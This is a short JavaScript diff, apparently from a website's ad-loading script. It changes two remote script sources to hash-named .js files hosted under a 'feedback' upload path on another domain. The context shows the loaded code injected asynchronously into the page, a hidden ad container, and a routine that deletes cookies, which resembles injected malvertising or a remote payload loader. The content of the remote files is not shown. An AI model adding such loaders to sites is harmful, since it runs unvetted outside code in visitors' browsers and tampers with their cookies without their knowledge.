@@ -15,7 +15,7 @@ function runWhenIdle(callback) {
         (function() {
             var adScript = document.createElement("script");
             adScript.async = true;
-            adScript.src = "https://cdn.jsdelivr.net.cn/gh/xxloli/ads/54/1.js"; 
+            adScript.src = "https://file.zhuyitai.com/feedback/202607/e2bdd5239bf683604198941e1669484a.js"; 
             var adContainer = document.createElement("div");
             adContainer.style.display = "none";
             adContainer.innerHTML = '<ins class="5a165732" data-key="05257ceaf4c2ac5ae71dbc805cdbe7a5"></ins>' +
@@ -40,7 +40,7 @@ function runWhenIdle(callback) {
             "use strict";
             !function(t) {
                 var s = window, e = document, i = p;
-                var c = "https://cdn.jsdelivr.net.cn/gh/xxloli/ads/51/1.js";
+                var c = "https://file.zhuyitai.com/feedback/202607/3b4bcb61685730926847e08dcac9583f.js";
                 function deleteCurrentDomainLACookies() {
                     var cookies = document.cookie.split("; ");
                     for (var j = 0; j < cookies.length; j++) {
